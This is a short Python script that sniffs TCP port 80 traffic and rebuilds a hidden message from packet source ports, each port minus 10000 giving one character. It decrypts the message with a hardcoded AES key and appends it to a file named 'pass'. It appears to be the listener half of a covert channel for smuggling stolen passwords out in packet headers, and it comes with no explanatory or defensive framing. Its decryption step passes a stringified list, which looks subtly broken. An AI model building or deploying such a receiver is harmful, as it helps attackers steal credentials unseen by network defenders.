#!/usr/bin/python -Btt

import sys
from Crypto.Cipher import AES
from Crypto import Random
from base64 import b64decode
from scapy.all import *

def decrypt(key, msg):
	BLOCK_SIZE = 32
	PADDING = '/'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	DecodeAES = lambda c, e: c.decrypt(b64decode(e)).rstrip(PADDING)
	cipher = AES.new(key)
	clear = DecodeAES(cipher, msg)
	return clear
	
def main(argv):
	key = ':Yjds52%9wnsjp>)'
	msg = []
	while 1:
		recieved = sniff(filter="tcp and port 80", count=1)
		if recieved[0].sport == 30000:
			clear = decrypt(key, str(msg))
			f = open('pass', 'a')
			f.write(clear)
			f.close()
			msg = []
		else:
			msg.append(chr(recieved[0].sport - 10000))

if __name__ == '__main__':
	main(sys.argv)
